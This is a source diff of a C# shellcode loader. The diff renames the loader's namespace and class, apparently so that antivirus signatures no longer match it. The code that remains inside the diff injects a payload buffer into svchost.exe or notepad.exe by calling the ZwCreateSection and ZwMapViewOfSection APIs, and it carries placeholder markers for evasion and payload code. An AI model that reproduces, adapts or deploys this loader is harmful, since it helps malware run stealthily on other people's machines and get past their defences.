@@ -10,13 +10,13 @@ using System.Diagnostics;
 
 //####DEFINE####
 
-namespace aesloader2
+namespace proudcat
 {
 
     //####CODE####
 
 
-    public sealed class Loader
+    public sealed class catloading
     {
         public static string strTargetProcess = "C:\\Windows\\System32\\svchost.exe";
         //public static string strTargetProcess = "C:\\Windows\\System32\\notepad.exe";
@@ -303,7 +303,7 @@ namespace aesloader2
         {
             return localmap_;
         }
-        ~Loader()
+        ~catloading()
         {
             //IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "ZwUnmapViewOfSection");
             //DELEGATES.ZwUnmapViewOfSection ZwUnmapViewOfSection = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ZwUnmapViewOfSection)) as DELEGATES.ZwUnmapViewOfSection;
@@ -333,13 +333,13 @@ namespace aesloader2
             CloseHandle(pinf.hProcess);
         }
 
-        public Loader()
+        public catloading()
         {
             section_ = new IntPtr();
             localmap_ = new IntPtr();
             inner_ = new byte[0x1000];
         }
-        public static void Main(string[] args)
+        public static void Main()
         {
 
             //####EVASION####
@@ -369,7 +369,7 @@ namespace aesloader2
             else
                 strTargetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
 
-            Loader ldr = new Loader();
+            catloading ldr = new catloading();
             ldr.Load(strTargetProcess, buf);
         }
     }
@@ -427,13 +427,13 @@ namespace aesloader2
 
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref aesloader2.STRUCTS.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
+        public delegate int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref proudcat.STRUCTS.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate void GetSystemInfo(ref aesloader2.STRUCTS.SYSTEM_INFO lpSysInfo);
+        public delegate void GetSystemInfo(ref proudcat.STRUCTS.SYSTEM_INFO lpSysInfo);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate IntPtr GetCurrentProcess();
